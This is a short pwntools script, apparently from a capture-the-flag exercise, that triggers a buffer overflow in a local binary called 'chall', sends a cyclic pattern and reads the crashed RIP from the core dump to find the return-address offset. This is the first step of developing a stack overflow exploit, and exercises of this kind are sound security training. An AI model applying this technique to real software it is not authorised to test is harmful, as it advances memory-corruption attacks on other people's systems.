from pwn import *

p = process("./chall")
p.sendline(b"17")  # Input size to trigger the overflow
p.sendline(cyclic(100, n=8))  # Generate a unique pattern

p.wait()
core = p.corefile
rip_value = core.rip  # Read the crashed RIP

print(f"RIP Value: {hex(rip_value)}")

offset = cyclic_find(rip_value, n=8)  # Find the offset
print(f"Offset: {offset}")
